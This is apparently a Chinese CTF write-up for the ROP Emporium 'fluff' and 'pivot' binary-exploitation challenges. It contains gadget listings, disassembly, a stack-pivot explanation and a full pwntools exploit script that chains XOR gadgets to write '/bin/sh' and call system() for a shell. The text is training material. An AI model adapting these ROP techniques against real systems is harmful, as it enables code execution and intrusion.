+NX保护+栈溢出 + 无/bin/sh = ROP + 写入/bin/sh</p>
+<blockquote>
+<p>这道题的难点就是rop链特别难构造
+这里，说实话，真正做题的时候可能因为知道要写入/bin/sh，所以要查找pop|mov|ret的gadget。接下来按照正常的思路找下去：</p>
+</blockquote>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/rop_emporium_all_challenges/06_fluff# ROPgadget --binary fluff --only &quot;pop|mov|ret&quot; --depth 20
+Gadgets information
+============================================================
+0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret
+0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
+0x0000000000400835 : mov ebp, 0x604060 ; ret
+0x0000000000400846 : mov ebx, 0x602050 ; ret
+0x0000000000400827 : mov edi, 0x601050 ; ret
+0x0000000000400845 : mov r11d, 0x602050 ; ret
+0x0000000000400834 : mov r13d, 0x604060 ; ret
+0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
+0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400825 : pop r14 ; mov edi, 0x601050 ; ret
+0x00000000004008c0 : pop r14 ; pop r15 ; ret
+0x0000000000400843 : pop r15 ; mov r11d, 0x602050 ; ret
+0x00000000004008c2 : pop r15 ; ret
+0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
+0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004006b0 : pop rbp ; ret
+0x00000000004008ba : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400844 : pop rdi ; mov r11d, 0x602050 ; ret
+0x00000000004008c3 : pop rdi ; ret
+0x0000000000400826 : pop rsi ; mov edi, 0x601050 ; ret
+0x00000000004008c1 : pop rsi ; pop r15 ; ret
+0x0000000000400833 : pop rsp ; mov r13d, 0x604060 ; ret
+0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005b9 : ret
+
+Unique gadgets found: 26
+</code></pre>
+<p>然而找不到什么东西，这时候就可以直接上ropper打印所有可以利用的gadget,
+这时候难点也来了，就是如何写入r11。
+然后就是脑洞了，不得不说这个真的牛逼。
+<strong>异或的灵活运用</strong></p>
+<pre><code>&gt;&gt;&gt; r11 = 100
+&gt;&gt;&gt; r11 ^= r11
+&gt;&gt;&gt; r11
+0
+&gt;&gt;&gt; r12 = 200
+&gt;&gt;&gt; r11 ^ r12
+200
+</code></pre>
+<p>就是0和任何数异或后，结果都为原来数的值</p>
+<blockquote>
+<p>0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;</p>
+</blockquote>
+<p>这个gadget 就是将r11寄存器清空了，所以r11的值为0</p>
+<blockquote>
+<p>0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;</p>
+</blockquote>
+<p>这时候r11返回的就是r12的值，从而使得r12可以传入[r10]
+准备工作</p>
+<ul>
+<li>要用到的gadget:</li>
+</ul>
+<pre><code>0x0400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
+0x040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
+0x0400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
+0x0400832: pop r12; mov r13d, 0x604060; ret;
+0x04008c3: pop rdi; ret;
+0x040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
+</code></pre>
+<ul>
+<li>要用到的地址</li>
+</ul>
+<pre><code>sys_addr:0x04005e0
+bss_addr:0x0601060
+</code></pre>
+<h3>构造EXP</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = process(&quot;./fluff&quot;)
+
+bss_addr = 0x0601060
+sys_addr =0x04005e0
+mov_r10_r11 = 0x040084e
+#mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
+xor_r11_r11 = 0x0400822
+#xor r11, r11; pop r14; mov edi, 0x601050; ret;
+xor_r11_r12 = 0x040082f
+#xor r11, r12; pop r12; mov r13d, 0x604060; ret;
+pop_r12 = 0x0400832
+#pop r12; mov r13d, 0x604060; ret;
+xchg_r11_r10 = 0x400840
+#xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
+pop_rdi = 0x40084d 
+#pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
+
+junk = '\x00'*8
+#跳过后面没用的gadget
+
+#bss_addr -&gt; r10
+payload = '\x00'*40
+payload += p64(pop_r12)
+payload += p64(bss_addr)
+payload += p64(xor_r11_r11) + junk
+payload += p64(xor_r11_r12) + junk
+payload += p64(xchg_r11_r10) + junk
+
+#&quot;/bin/sh\x00&quot; -&gt; r11
+payload += p64(pop_r12)
+payload += &quot;/bin/sh\x00&quot;
+payload += p64(xor_r11_r11) + junk
+payload += p64(xor_r11_r12) + junk
+
+#调用system()
+payload += p64(pop_rdi)
+payload +=p64(bss_addr)+junk+p64(0)+p64(sys_addr)
+
+
+p.recvuntil(&quot;&gt;&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>#5.总结</p>
+<ul>
+<li>不要因为要写的EXP很长就去放弃他，只要理清了思路就可以很快地写出EXP</li>
+<li>汇编的知识一定要熟悉掌握</li>
+<li>一定要有耐心</li>
+<li>参考资料<a href="https://www.rootnetsec.com/ropemporium-fluff/">ROP Emporium - fluff</a></li>
+</ul>
+<h2>ROP-Emporium_pivot</h2>
+<p>+================+
+|   加深对ROP的理解     |
++================+</p>
+<h3>基本信息</h3>
+<p>文件相关</p>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    11395
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    ./
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<p>关键的地方说几点吧：</p>
+<pre><code>arch     x86
+bintype  elf
+bits     64
+nx       true
+os       linux
+relocs   true
+</code></pre>
+<p>又是NX保护，但是开启了地址随机化，这个就需要泄露函数地址</p>
+<ul>
+<li>1.2运行：</li>
+</ul>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/rop_emporium_all_challenges/07_pivot# ./pivot
+pivot by ROP Emporium
+64bits
+
+Call ret2win() from libpivot.so
+The Old Gods kindly bestow upon you a place to pivot: 0x7f84d380ff10
+Send your second chain now and it will land there
+&gt; a
+Now kindly send your stack smash
+&gt; aaaa
+
+Exiting
+</code></pre>
+<h3>代码分析</h3>
+<pre><code>[0x004008a0]&gt; afl
+0x004008a0    1 41           entry0
+0x00400830    1 6            sym.imp.__libc_start_main
+0x004007b8    3 26           sym._init
+0x00400b84    1 9            sym._fini
+0x004008d0    4 50   -&gt; 41   sym.deregister_tm_clones
+0x00400910    4 58   -&gt; 55   sym.register_tm_clones
+0x00400950    3 28           entry.fini0
+0x00400970    4 38   -&gt; 35   entry.init0
+0x00400a3b    1 167          sym.pwnme
+0x00400820    1 6            sym.imp.memset
+0x00400800    1 6            sym.imp.puts
+0x00400810    1 6            sym.imp.printf
+0x00400840    1 6            sym.imp.fgets
+0x00400ae2    1 24           sym.uselessFunction
+0x00400850    1 6            sym.imp.foothold_function
+0x00400880    1 6            sym.imp.exit
+0x00400b80    1 2            sym.__libc_csu_fini
+0x00400b10    4 101          sym.__libc_csu_init
+0x00400996    1 165          main
+0x00400870    1 6            sym.imp.setvbuf
+0x00400860    1 6            sym.imp.malloc
+0x004007f0    1 6            sym.imp.free
+</code></pre>
+<ul>
+<li><code>main</code></li>
+</ul>
+<pre><code>[0x004008a0]&gt; pdf @main
+            ; DATA XREF from entry0 @ 0x4008bd
+┌ 165: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_10h @ rbp-0x10
+│           ; var void *ptr @ rbp-0x8
+│           0x00400996      55             push rbp
+│           0x00400997      4889e5         mov rbp, rsp
+│           0x0040099a      4883ec10       sub rsp, 0x10
+│           0x0040099e      488b05db1620.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
+│                                                                      ; [0x602080:8]=0
+│           0x004009a5      b900000000     mov ecx, 0                  ; size_t size
+│           0x004009aa      ba02000000     mov edx, 2                  ; int mode
+│           0x004009af      be00000000     mov esi, 0                  ; char *buf
+│           0x004009b4      4889c7         mov rdi, rax                ; FILE*stream
+│           0x004009b7      e8b4feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x004009bc      488b05dd1620.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
+│                                                                      ; [0x6020a0:8]=0
+│           0x004009c3      b900000000     mov ecx, 0                  ; size_t size
+│           0x004009c8      ba02000000     mov edx, 2                  ; int mode
+│           0x004009cd      be00000000     mov esi, 0                  ; char *buf
+│           0x004009d2      4889c7         mov rdi, rax                ; FILE*stream
+│           0x004009d5      e896feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x004009da      bf980b4000     mov edi, str.pivot_by_ROP_Emporium ; 0x400b98 ; &quot;pivot by ROP Emporium&quot; ; const char *s
+│           0x004009df      e81cfeffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004009e4      bfae0b4000     mov edi, str.64bits         ; 0x400bae ; &quot;64bits\n&quot; ; const char *s
+│           0x004009e9      e812feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004009ee      bf00000001     mov edi, 0x1000000          ; size_t size
+│           0x004009f3      e868feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
+│           0x004009f8      488945f8       mov qword [ptr], rax
+│           0x004009fc      488b45f8       mov rax, qword [ptr]
+│           0x00400a00      480500ffff00   add rax, 0xffff00
+│           0x00400a06      488945f0       mov qword [var_10h], rax
+│           0x00400a0a      488b45f0       mov rax, qword [var_10h]
+│           0x00400a0e      4889c7         mov rdi, rax
+│           0x00400a11      e825000000     call sym.pwnme
+│           0x00400a16      48c745f00000.  mov qword [var_10h], 0
+│           0x00400a1e      488b45f8       mov rax, qword [ptr]
+│           0x00400a22      4889c7         mov rdi, rax                ; void *ptr
+│           0x00400a25      e8c6fdffff     call sym.imp.free           ; void free(void *ptr)
+│           0x00400a2a      bfb60b4000     mov edi, str.Exiting        ; 0x400bb6 ; &quot;\nExiting&quot; ; const char *s
+│           0x00400a2f      e8ccfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400a34      b800000000     mov eax, 0
+│           0x00400a39      c9             leave
+└           0x00400a3a      c3             ret
+</code></pre>
+<p>实在看不懂也可以用IDA：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char *ptr; // ST08_8
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  puts(&quot;pivot by ROP Emporium&quot;);
+  puts(&quot;64bits\n&quot;);
+  ptr = (char *)malloc(0x1000000uLL);
+  pwnme(ptr + 16776960, 0LL);
+  free(ptr);
+  puts(&quot;\nExiting&quot;);
+  return 0;
+}
+</code></pre>
+<p>就是pwnme整个函数的栈是在ptr(malloc分配的堆)+16776960上面运行的</p>
+<ul>
+<li><code>pwnme</code></li>
+</ul>
+<pre><code class="language-assembly">[0x004008a0]&gt; pdf @sym.pwnme
+            ; CALL XREF from main @ 0x400a11
+┌ 167: sym.pwnme (char *arg1);
+│           ; var char *var_28h @ rbp-0x28
+│           ; var char *s @ rbp-0x20
+│           ; arg char *arg1 @ rdi
+│           0x00400a3b      55             push rbp
+│           0x00400a3c      4889e5         mov rbp, rsp
+│           0x00400a3f      4883ec30       sub rsp, 0x30
+│           0x00400a43      48897dd8       mov qword [var_28h], rdi    ; arg1
+│           0x00400a47      488d45e0       lea rax, [s]
+│           0x00400a4b      ba20000000     mov edx, 0x20               ; 32 ; size_t n
+│           0x00400a50      be00000000     mov esi, 0                  ; int c
+│           0x00400a55      4889c7         mov rdi, rax                ; void *s
+│           0x00400a58      e8c3fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
+│           0x00400a5d      bfc00b4000     mov edi, str.Call_ret2win___from_libpivot.so ; 0x400bc0 ; &quot;Call ret2win() from libpivot.so&quot; ; const char *s
+│           0x00400a62      e899fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400a67      488b45d8       mov rax, qword [var_28h]
+│           0x00400a6b      4889c6         mov rsi, rax
+│           0x00400a6e      bfe00b4000     mov edi, str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p ; 0x400be0 ; &quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot; ; const char *format
+│           0x00400a73      b800000000     mov eax, 0
+│           0x00400a78      e893fdffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x00400a7d      bf200c4000     mov edi, str.Send_your_second_chain_now_and_it_will_land_there ; 0x400c20 ; &quot;Send your second chain now and it will land there&quot; ; const char *s
+│           0x00400a82      e879fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400a87      bf520c4000     mov edi, 0x400c52           ; const char *format
+│           0x00400a8c      b800000000     mov eax, 0
+│           0x00400a91      e87afdffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x00400a96      488b15f31520.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
+│                                                                      ; [0x602090:8]=0 ; FILE *stream
+│           0x00400a9d      488b45d8       mov rax, qword [var_28h]
+│           0x00400aa1      be00010000     mov esi, 0x100              ; 256 ; int size
+│           0x00400aa6      4889c7         mov rdi, rax                ; char *s
+│           0x00400aa9      e892fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+│           0x00400aae      bf580c4000     mov edi, str.Now_kindly_send_your_stack_smash ; 0x400c58 ; &quot;Now kindly send your stack smash&quot; ; const char *s
+│           0x00400ab3      e848fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400ab8      bf520c4000     mov edi, 0x400c52           ; const char *format
+│           0x00400abd      b800000000     mov eax, 0
+│           0x00400ac2      e849fdffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x00400ac7      488b15c21520.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
+│                                                                      ; [0x602090:8]=0 ; FILE *stream
+│           0x00400ace      488d45e0       lea rax, [s]
+│           0x00400ad2      be40000000     mov esi, 0x40               ; '@' ; 64 ; int size
+│           0x00400ad7      4889c7         mov rdi, rax                ; char *s
+│           0x00400ada      e861fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+│           0x00400adf      90             nop
+│           0x00400ae0      c9             leave
+└           0x00400ae1      c3             ret
+</code></pre>
+<p>IDA:</p>
+<pre><code class="language-c">char *__fastcall pwnme(char *a1)
+{
+  char s; // [rsp+10h] [rbp-20h]
+
+  memset(&amp;s, 0, 0x20uLL);
+  puts(&quot;Call ret2win() from libpivot.so&quot;);
+  printf(&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;, a1);
+  puts(&quot;Send your second chain now and it will land there&quot;);
+  printf(&quot;&gt; &quot;);
+  fgets(a1, 256, stdin);
+  puts(&quot;Now kindly send your stack smash&quot;);
+  printf(&quot;&gt; &quot;, 256LL);
+  return fgets(&amp;s, 64, stdin);
+}
+</code></pre>
+<p> 因为开启了随机化地址(ASLR)，本来是要想办法找到a1的地址，但是这里降低了难度，直接给我们打印出来了。而且第一个fgets写入的地址是直接写入到a1这个空间上。
+ 还有一点就是fgets的溢出漏洞。</p>
+<ul>
+<li><code>uselessFunction</code></li>
+</ul>
+<pre><code class="language-assembly">[0x004008a0]&gt; pdf @sym.uselessFunction
+┌ 24: sym.uselessFunction ();
+│           0x00400ae2      55             push rbp
+│           0x00400ae3      4889e5         mov rbp, rsp
+│           0x00400ae6      b800000000     mov eax, 0
+│           0x00400aeb      e860fdffff     call sym.imp.foothold_function
+│           0x00400af0      bf01000000     mov edi, 1          ; int status
+└           0x00400af5      e886fdffff     call sym.imp.exit   ; void exit(int status)
+</code></pre>
+<p>IDA</p>
+<pre><code class="language-c">void __noreturn uselessFunction()
+{
+  foothold_function();
+  exit(1);
+}
+</code></pre>
+<p>调用了foothold_function这个函数，但是并不useless!</p>
+<ul>
+<li>foothold_function:</li>
+</ul>
+<pre><code class="language-assembly">[0x004008a0]&gt; pdf @sym.imp.foothold_function
+            ; CALL XREF from sym.uselessFunction @ 0x400aeb
+┌ 6: sym.imp.foothold_function ();
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+└           0x00400850      ff25f2172000   jmp qword [reloc.foothold_function] ; [0x602048:8]=0x400856 ; &quot;V\b@&quot;
+</code></pre>
+<p>说明了这里引用了外面的一个库，由经验决定这个是携带的库文件:libpivot.so
+##2.2 lippivot.so
+###2.2.1直接上r2:</p>
+<pre><code class="language-c">[0x00000870]&gt; afl
+0x00000870    4 50   -&gt; 44   entry0
+0x00000970    1 24           sym.foothold_function
+0x00000840    1 6            sym.imp.printf
+0x00000ad8    1 9            sym._fini
+0x000007f8    3 26           sym._init
+0x00000850    1 6            sym.imp.exit
+0x00000830    1 6            sym.imp.system
+0x000008b0    4 66   -&gt; 57   sym.register_tm_clones
+0x00000900    5 50           entry.fini0
+0x00000940    4 48   -&gt; 42   entry.init0
+0x00000000    3 124  -&gt; 109  loc.imp._ITM_deregisterTMCloneTable
+0x00000988    1 31           sym.void_function_01
+0x000009a7    1 31           sym.void_function_02
+0x000009c6    1 31           sym.void_function_03
+0x000009e5    1 31           sym.void_function_04
+0x00000a04    1 31           sym.void_function_05
+0x00000a23    1 31           sym.void_function_06
+0x00000a42    1 31           sym.void_function_07
+0x00000a61    1 31           sym.void_function_08
+0x00000a80    1 31           sym.void_function_09
+0x00000a9f    1 31           sym.void_function_10
+0x00000abe    1 26           sym.ret2win
+</code></pre>
+<p>发现了ret2win foothold_function
+<code>foothold_function</code></p>
+<pre><code class="language-assembly">[0x00000870]&gt; pdf @sym.foothold_function
+┌ 24: sym.foothold_function ();
+│           0x00000970      55             push rbp
+│           0x00000971      4889e5         mov rbp, rsp
+│           0x00000974      488d3d6d0100.  lea rdi, str.foothold_function____check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot.so ; sym..rodata
+│                                                                      ; 0xae8 ; &quot;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&quot; ; const char *format
+│           0x0000097b      b800000000     mov eax, 0
+│           0x00000980      e8bbfeffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x00000985      90             nop
+│           0x00000986      5d             pop rbp
+└           0x00000987      c3             ret
+</code></pre>
+<p>IDA:</p>
+<pre><code class="language-c">int foothold_function()
+{
+  return printf(&quot;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&quot;);
+}
+</code></pre>
+<p>这个函数并没有什么用,只是提醒了我们该用什么方法
+<code>ret2win</code></p>
+<pre><code class="language-assembly">[0x00000870]&gt; pdf @sym.ret2win
+┌ 26: sym.ret2win ();
+│           0x00000abe      55             push rbp
+│           0x00000abf      4889e5         mov rbp, rsp
+│           0x00000ac2      488d3d880000.  lea rdi, str.bin_cat_flag.txt ; 0xb51 ; &quot;/bin/cat flag.txt&quot; ; const char *string
+│           0x00000ac9      e862fdffff     call sym.imp.system         ; int system(const char *string)
+│           0x00000ace      bf00000000     mov edi, 0                  ; int status
+└           0x00000ad3      e878fdffff     call sym.imp.exit           ; void exit(int status)
+</code></pre>
+<p>IDA:</p>
+<pre><code class="language-c">void __noreturn ret2win()
+{
+  system(&quot;/bin/cat flag.txt&quot;);
+  exit(0);
+}
+</code></pre>
+<p>发现了留下来的后门程序</p>
+<p><strong>利用libc</strong>
+ 由于开启了地址随机化，我们不能直接按地址调用库里面的函数，但是如果知道了一个函数的地址，用之前计算好的偏移，就可以知道这个函数的相对地址。
+ 这种方法有点类似于天文学家关于未知行星的研究，从一个相对的地方来推导，可以理解为科学的一种思维
+ 就是泄露ret2win需要一个got地址，可以在 <a href="https://blog.csdn.net/gebigye/article/details/51290883">这里</a>了解got和plt，其实之前的<a href="https://www.jianshu.com/p/57b6da7e5f23">ROP Emporium-新手学习-callme(64)</a>里面也涉及了，总之就是调用了plt才会有got，最后才能找到动态链接库的入口，也就是这里foothold函数的真正地址</p>
+<p>在r2中实现如下:</p>
+<pre><code class="language-assembly">[0x004008a0]&gt; ir
+[Relocations]
+
+vaddr      paddr      type   name
+―――――――――――――――――――――――――――――――――
+0x00601ff8 0x00001ff8 SET_64  __gmon_start__
+0x00602018 0x00002018 SET_64  free
+0x00602020 0x00002020 SET_64  puts
+0x00602028 0x00002028 SET_64  printf
+0x00602030 0x00002030 SET_64  memset
+0x00602038 0x00002038 SET_64  __libc_start_main
+0x00602040 0x00002040 SET_64  fgets
+0x00602048 0x00002048 SET_64  foothold_function
+0x00602050 0x00002050 SET_64  malloc
+0x00602058 0x00002058 SET_64  setvbuf
+0x00602060 0x00002060 SET_64  exit
+0x00602080 0x00602080 SET_64  stdout
+0x00602090 0x00602090 SET_64  stdin
+0x006020a0 0x006020a0 SET_64  stderr
+
+
+14 relocations
+</code></pre>
+<h3>准备工作</h3>
+<p>思路：
+回顾漏洞点函数<code>pwnme</code></p>
+<pre><code class="language-c">char *__fastcall pwnme(char *a1)
+{
+  char s; // [rsp+10h] [rbp-20h]
+
+  memset(&amp;s, 0, 0x20uLL);
+  puts(&quot;Call ret2win() from libpivot.so&quot;);
+  printf(&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;, a1);
+  puts(&quot;Send your second chain now and it will land there&quot;);
+  printf(&quot;&gt; &quot;);
+  fgets(a1, 256, stdin);
+  puts(&quot;Now kindly send your stack smash&quot;);
+  printf(&quot;&gt; &quot;, 256LL);
+  return fgets(&amp;s, 64, stdin);
+}
+</code></pre>
+<p>第一个在堆块上随意写，第二个可以用的空间是64-32=32，不够用，所以这里要用一个方法，也是本篇想记录的方法</p>
+<blockquote>
+<p>stack pivot ---栈的迁移
+###3.1.2 stack pivot，栈的迁移：</p>
+</blockquote>
+<ul>
+<li>原理</li>
+</ul>
+<blockquote>
+<p>即通过覆盖调用者的 ebp，将栈帧转 移到另一个地方，同时控制	eip，即可改变程序的执行流</p>
+</blockquote>
+<ul>
+<li>payload结构：</li>
+</ul>
+<blockquote>
+<p>buffer	padding	|	fake	ebp	|	leave;ret	addr	|</p>
+</blockquote>
+<ul>
+<li>大致过程</li>
+</ul>
+<blockquote>
+<p>这样函数的返回地址就被覆盖为	leave;ret	指令的地址，这样程序在执行完其原本的 leave;ret	后，又执行了一次	leave;ret。
+另外	fake	ebp	指向我们另一段	payload（这里称为主payload）	的	ebp</p>
+</blockquote>
+<ul>
+<li>常用方法
+我们知道一个函数的入口点通常是：</li>
+</ul>
+<pre><code>push ebp 
+mov	ebp;esp
+</code></pre>
+<p>leave指令相当于：</p>
+<pre><code>mov	esp,
+ebp pop,ebp
+</code></pre>
+<p>ret	指令为相当于：</p>
+<pre><code>pop	eip
+</code></pre>
+<p><strong>整体思路</strong>
+第一次写入一部分paylaod,第二次实现栈的转移，大概是:</p>
+<p>rbp---&gt;fake rbp</p>
+<p><strong>ROP链的构造</strong>
+ropper:</p>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/rop_emporium_all_challenges/07_pivot# ropper --file pivot
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+
+
+
+Gadgets
+=======
+
+
+0x0000000000400b7f: add bl, dh; ret;
+0x0000000000400984: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 0x0000000000400b7d: add byte ptr [rax], al; add bl, dh; ret;
+0x0000000000400982: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax;
+0x0000000000400b7b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret;
+0x00000000004008fc: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
+0x0000000000400a35: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
+0x0000000000400a36: add byte ptr [rax], al; add cl, cl; ret;
+0x00000000004007cb: add byte ptr [rax], al; add rsp, 8; ret;
+0x0000000000400af3: add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
+0x0000000000400ad5: add byte ptr [rax], al; mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400afe: add byte ptr [rax], al; pop rax; ret;
+0x00000000004008fe: add byte ptr [rax], al; pop rbp; ret;
+0x0000000000400b82: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret;
+0x00000000004008e8: add byte ptr [rax], al; test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400936: add byte ptr [rax], al; test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400983: add byte ptr [rax], al; test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400a37: add byte ptr [rax], al; leave; ret;
+0x0000000000400afd: add byte ptr [rax], r8b; pop rax; ret;
+0x0000000000400a38: add cl, cl; ret;
+0x0000000000400af1: add dword ptr [rax], eax; add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
+0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret;
+0x0000000000400b0a: add eax, ebp; ret;
+0x0000000000400969: add ebx, esi; ret;
+0x00000000004007ce: add esp, 8; ret;
+0x0000000000400b09: add rax, rbp; ret;
+0x00000000004007cd: add rsp, 8; ret;
+0x00000000004008f2: and byte ptr [rax], ah; jmp rax;
+0x0000000000400967: and byte ptr [rax], al; add ebx, esi; ret;
+0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
+0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret;
+0x0000000000400ada: call 0x840; nop; leave; ret;
+0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
+0x0000000000400af5: call 0x880; nop word ptr [rax + rax]; pop rax; ret;
+0x0000000000400995: call qword ptr [rbp + 0x48];
+0x000000000040098e: call rax;
+0x0000000000400ca3: call rsp;
+0x0000000000400b5c: fmul qword ptr [rax - 0x7d]; ret;
+0x00000000004008ed: je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x000000000040093b: je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400988: je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400d9b: jmp qword ptr [rbp];
+0x0000000000400d5b: jmp qword ptr [rdi];
+0x0000000000400af9: jmp qword ptr [rsi + 0xf];
+0x00000000004008f5: jmp rax;
+0x0000000000400961: lcall [rbp - 0x3a]; add eax, 0x20173e; add ebx, esi; ret;
+0x0000000000400a34: mov eax, 0; leave; ret;
+0x0000000000400b06: mov eax, dword ptr [rax]; ret;
+0x000000000040098c: mov ebp, esp; call rax;
+0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
+0x00000000004008f0: mov edi, 0x602078; jmp rax;
+0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
+0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret;
+0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400b05: mov rax, qword ptr [rax]; ret;
+0x000000000040098b: mov rbp, rsp; call rax;
+0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400afb: nop dword ptr [rax + rax]; pop rax; ret;
+0x00000000004008f8: nop dword ptr [rax + rax]; pop rbp; ret;
+0x0000000000400945: nop dword ptr [rax]; pop rbp; ret;
+0x0000000000400afa: nop word ptr [rax + rax]; pop rax; ret;
+0x00000000004008f7: nop word ptr [rax + rax]; pop rbp; ret;
+0x0000000000400a2c: or eax, dword ptr [rax]; call 0x800; mov eax, 0; leave; ret;
+0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret;
+0x0000000000400b6e: pop r13; pop r14; pop r15; ret;
+0x0000000000400b70: pop r14; pop r15; ret;
+0x0000000000400b72: pop r15; ret;
+0x0000000000400b00: pop rax; ret;
+0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+0x0000000000400b6f: pop rbp; pop r14; pop r15; ret;
+0x0000000000400900: pop rbp; ret;
+0x0000000000400b73: pop rdi; ret;
+0x0000000000400b71: pop rsi; pop r15; ret;
+0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
+0x000000000040098a: push rbp; mov rbp, rsp; call rax;
+0x0000000000400aca: ret 0x2015;
+0x0000000000400987: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax;
+0x0000000000400b85: sub esp, 8; add rsp, 8; ret;
+0x0000000000400b84: sub rsp, 8; add rsp, 8; ret;
